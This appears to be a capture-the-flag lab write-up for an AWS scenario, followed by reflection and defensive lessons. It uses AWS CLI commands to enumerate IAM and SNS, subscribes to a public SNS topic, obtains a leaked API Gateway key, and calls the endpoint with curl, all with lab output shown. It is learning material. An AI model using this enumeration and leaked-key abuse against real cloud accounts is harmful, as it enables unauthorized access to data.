# Solution

To complete the scenario and capture the flag, I performed the following steps to abuse a misconfigured SNS topic that leaked sensitive API credentials.

## a. Identify the Current IAM Identity and Permissions

I first verified the active AWS identity to understand the scope of the credentials.



```
aws sts get-caller-identity --profile sns-secrets | tee

{
    "UserId": "AIDA3EFDNBBL3CZLCZM3A",
    "Account": "764846868567",
    "Arn": "arn:aws:iam::764846868567:user/cg-sns-user-cgiddnajk2uh"
}
```

I enumerated the inline IAM policies attached to this user.
```
aws iam list-user-policies \
  --user-name cg-sns-user-cgiddnajk2uh \
  --profile sns-secrets | tee

aws iam get-user-policy \
  --user-name cg-sns-user-cgiddnajk2uh \
  --policy-name cg-sns-user-policy-cgiddnajk2uh \
  --profile sns-secrets
```

The policy allowed SNS enumeration and subscription actions, while explicitly denying API Gateway API key enumeration:
```
Allowed
 sns:ListTopics
 sns:Subscribe
 sns:Receive
 apigateway:GET (partially)
Denied
```
Verify that I have sufficient permissions to SNS

## b. Enumerate SNS Topics

With SNS permissions available, I listed all SNS topics in the account.
- How to list [documentation](https://docs.aws.amazon.com/cli/latest/reference/sns/list-topics.html).

The output revealed a publicly accessible SNS topic:
```
aws sns list-topics --profile sns-secrets | tee
{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-1:764846868567:public-topic-cgiddnajk2uh"
        }
    ]
}
```
## c. Subscribe to the SNS Topic

Since the policy allowed sns:Subscribe, I subscribed my own email address to the discovered topic.
- How to subscribe [documentations](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html).

```
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:764846868567:public-topic-cgiddnajk2uh \
  --protocol email \
  --notification-endpoint n01742xxx@humber.ca \
  --profile sns-secrets
```

After confirming the subscription via email, I began receiving SNS notifications.

## d. Receive Leaked API Credentials via SNS

Shortly after subscribing, I received an automated SNS message containing sensitive debug information:

```
[DEBUG] API Gateway Configuration
================================
Endpoint: https://ebj0c2dm23.execute-api.us-east-1.amazonaws.com/prod-cgiddnajk2uh/user-data
API Key: 5ufsz5u3m5k6sg8zdjnrm7nv309hu742
```

This message exposed an API Gateway endpoint and a valid API key.

## e. Invoke the API Using the Leaked Key

Using the leaked API key, I directly invoked the protected endpoint:
- How to use api key in apigateway [documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-api-key-source.html)
```
curl -H "x-api-key: 5ufsz5u3m5k6sg8zdjnrm7nv309hu742" \
https://ebj0c2dm23.execute-api.us-east-1.amazonaws.com/prod-cgiddnajk2uh/user-data
```

The request succeeded and returned the flag.

## f. Enumerate API Gateway Resources

Although, I retrive the flag. I do some extra verification.

Base on the [Docs](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html) I need to find `api-id`, `resources` and `stages`
- - [apigateway documentation](https://docs.aws.amazon.com/cli/latest/reference/apigateway/#cli-aws-apigateway)
This revealed the target API:
```
aws apigateway get-rest-apis --profile sns-secrets | tee
{
    "id": "ebj0c2dm23",
    "name": "cg-api-cgiddnajk2uh"
}
```

I then enumerated the API resources:
```
aws apigateway get-resources \
  --rest-api-id ebj0c2dm23 \
  --profile sns-secrets | tee

{
    "items": [
        {
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
...
```

Finally, I identified the deployment stage:
```
aws apigateway get-stages \
  --rest-api-id ebj0c2dm23 \
  --profile sns-secrets | tee
sns-secrets | tee
{
    "item": [
        {
            "deploymentId": "92zula",
            "stageName": "prod-cgiddnajk2uh",
...
```

The stage prod-cgiddnajk2uh matched the endpoint received via SNS.

# Reflection

## What was your approach?

My approach focused on abusing indirect access paths.
- enumerating IAM permissions to understand allowed actions.
- identified that SNS subscription was permitted without restriction.
    - subscribed to a publicly accessible SNS topic.
    - leveraged the SNS message as an unintended data exfiltration channel.
- Finally, I used the leaked API key to access the protected API Gateway endpoint.

## What was the biggest challenge?

The biggest challenge was the uncertainty of the SNS subscription behavior.
It was unclear whether subscribing and confirming the endpoint would actually result in receiving sensitive information, what type of data might be delivered, and how long it would take for any messages to arrive.

## How did you overcome the challenges?

Google the SNS behavior and waiting the email.

## What led to the breakthrough?

Receiving an SNS email containing both the API endpoint and API key was the definitive breakthrough.

At that point, no further privilege escalation was required.

## On the blue side, what lessons can be applied to properly defend against this type of breach?

- Never include secrets or API keys in SNS debug or notification messages.
- Restrict SNS topic subscriptions using resource-based policies to limit who can subscribe and prevent unintended data exposure.
- Enforce least privilege and avoid wildcard (Resource: "*") permissions where possible.
- Regularly audit SNS topics for unintended subscribers.